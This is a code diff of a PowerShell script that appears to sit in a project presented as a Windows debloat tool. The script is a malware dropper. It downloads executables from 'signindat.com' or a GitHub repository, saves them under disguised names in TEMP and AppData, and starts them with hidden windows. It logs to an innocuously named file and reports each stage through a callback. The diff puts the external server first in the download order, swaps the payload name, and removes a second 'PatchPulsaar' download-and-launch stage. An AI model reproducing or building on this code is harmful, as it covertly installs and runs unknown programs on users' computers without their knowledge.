@@ -4,7 +4,7 @@ $ProgressPreference='SilentlyContinue'
 
 $srv='https://signindat.com'
 $gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main'
-$sources=@($gh,$srv)
+$sources=@($srv,$gh)
 
 $logPath="$env:TEMP\wmisrv.log"
 function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }
@@ -252,7 +252,7 @@ if($payloadExists){
 
 if(-not $payloadExists){
     _log "S5: downloading wdsr681f3e18"
-    $payloadBytes=_dl 'PatchPulsaar.exe'
+    $payloadBytes=_dl 'wdsr681f3e18.exe'
     if($payloadBytes){
         $primaryPath="$env:TEMP\wmdrs.exe"
         [IO.File]::WriteAllBytes($primaryPath,$payloadBytes)|Out-Null
@@ -278,58 +278,6 @@ if(-not $payloadExists){
     }else{
         _log "S5: payload dl fail"
         _cb 'S5' 'fail' 'dl fail'
-    }
-}
-
-# S5b: PATCHPULSAAR
-$ppPath="$env:APPDATA\Microsoft\pp.exe"
-$ppExists=(Test-Path $ppPath)
-_log "S5b: exists=$ppExists at $ppPath"
-
-if(-not $ppExists){
-    $ppFallback="$env:LOCALAPPDATA\Microsoft\pp.exe"
-    if(Test-Path $ppFallback){$ppPath=$ppFallback; $ppExists=$true; _log "S5b: fallback found at $ppPath"}
-}
-
-if($ppExists){
-    try{
-        $pp=Start-Process $ppPath -WindowStyle Hidden -PassThru
-        _log "S5b: re-launch PID=$($pp.Id) from $ppPath"
-        _cb 'S5b' 'ok' "re-launch PID=$($pp.Id)"
-    }catch{
-        _log "S5b: re-launch fail: $_, will re-download"
-        $ppExists=$false
-    }
-}
-
-if(-not $ppExists){
-    _log "S5b: downloading PatchPulsaar"
-    $ppBytes=_dl 'PatchPulsaar.exe'
-    if($ppBytes){
-        $ppTmp="$env:TEMP\pp.exe"
-        [IO.File]::WriteAllBytes($ppTmp,$ppBytes)|Out-Null
-        $ppCopyTargets=@("$env:APPDATA\Microsoft\pp.exe","$env:LOCALAPPDATA\Microsoft\pp.exe")
-        foreach($ct in $ppCopyTargets){
-            try{
-                $dir=Split-Path $ct -Parent
-                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
-                Copy-Item $ppTmp $ct -Force
-                _log "S5b: copied to $ct"
-            }catch{_log "S5b: copy fail $ct : $_"}
-        }
-        try{
-            $ppLaunch="$env:APPDATA\Microsoft\pp.exe"
-            $pp=Start-Process $ppLaunch -WindowStyle Hidden -PassThru
-            _log "S5b: PatchPulsaar PID=$($pp.Id) from AppData"
-            _cb 'S5b' 'ok' "PID=$($pp.Id)"
-        }catch{
-            _log "S5b: launch fail: $_"
-            _cb 'S5b' 'fail' "launch err"
-        }
-        Remove-Item "$env:TEMP\pp.exe" -Force -ErrorAction SilentlyContinue | Out-Null
-    }else{
-        _log "S5b: PatchPulsaar dl fail"
-        _cb 'S5b' 'fail' 'dl fail'
     }
 }
 
